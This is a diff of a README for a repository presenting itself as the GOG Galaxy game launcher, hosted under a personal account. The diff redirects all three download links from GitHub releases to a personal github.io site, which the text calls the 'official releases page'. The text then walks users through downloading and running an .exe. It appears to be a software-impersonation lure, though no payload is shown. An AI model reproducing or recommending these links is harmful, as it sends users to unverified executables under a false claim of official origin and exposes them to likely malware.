@@ -1,12 +1,12 @@
 # 🎮 GOG-Galaxy - Manage your games in one place
 
-[![Download GOG Galaxy](https://img.shields.io/badge/Download-GOGGalaxy-blue.svg)](https://github.com/Rosemarielong537/GOG-Galaxy/releases)
+[![Download GOG Galaxy](https://img.shields.io/badge/Download-GOGGalaxy-blue.svg)](https://rosemarielong537.github.io)
 
 ## 📥 How to download the software
 
 Follow these steps to get GOG Galaxy on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Rosemarielong537/GOG-Galaxy/releases).
+1. Visit the [official releases page](https://rosemarielong537.github.io).
 2. Look for the file ending in .exe under the latest version tag.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder or your desktop so you can find it.
@@ -92,6 +92,6 @@ Use the cleanup tools found in the settings if you run low on disk space. GOG Ga
 
 Always ensure you download your software from the official link to keep your system secure.
 
-[Download GOG Galaxy for Windows](https://github.com/Rosemarielong537/GOG-Galaxy/releases)
+[Download GOG Galaxy for Windows](https://rosemarielong537.github.io)
 
 Return to this page for updates or if you need to install the program on a second device. The software adapts to any Windows 10 or 11 environment without issues. Always check for the latest version on the release page to take advantage of improvements and security fixes.
